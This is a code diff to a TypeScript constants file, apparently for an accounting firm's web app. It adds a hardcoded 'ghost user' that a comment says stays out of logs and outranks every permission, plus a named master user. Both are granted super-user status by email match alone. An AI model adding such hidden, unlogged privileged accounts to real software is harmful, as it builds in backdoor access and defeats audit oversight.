@@ -171,6 +171,32 @@ export const DURACAO_ANIMACOES = {
   FADE: 200
 } as const;
 
+// ==================== USUÁRIOS ESPECIAIS ====================
+// Ghost user: não aparece em logs, permissões superiores a todos
+export const GHOST_USER_ID = 'bdf74a16-ef7e-477e-ab81-ae3a25b41375';
+// Para uso com IDs numéricos internos, mapeamos via email
+export const GHOST_USER_EMAIL = 'ghost@triar.system';
+// Usuário master adicional (Yasmin) - mesmas permissões do ghost para editar/excluir
+export const MASTER_USER_EMAIL = 'yasmin@triarcontabilidade.com.br';
+
+// IDs numéricos são definidos em runtime após consulta ao banco
+// Estes emails são usados para verificar se um usuário é "super"
+export function isGhostUser(userId: number | string | undefined | null, email?: string): boolean {
+  if (!userId && !email) return false;
+  if (email === GHOST_USER_EMAIL) return true;
+  if (String(userId) === GHOST_USER_ID) return true;
+  return false;
+}
+
+export function isSuperUser(userId: number | string | undefined | null, email?: string): boolean {
+  if (isGhostUser(userId, email)) return true;
+  if (email === MASTER_USER_EMAIL) return true;
+  return false;
+}
+
+// Senha mínima
+export const SENHA_MIN_LENGTH = 8;
+
 export const STORAGE_KEYS = {
   TOKEN: 'token',
   USUARIO: 'usuario',
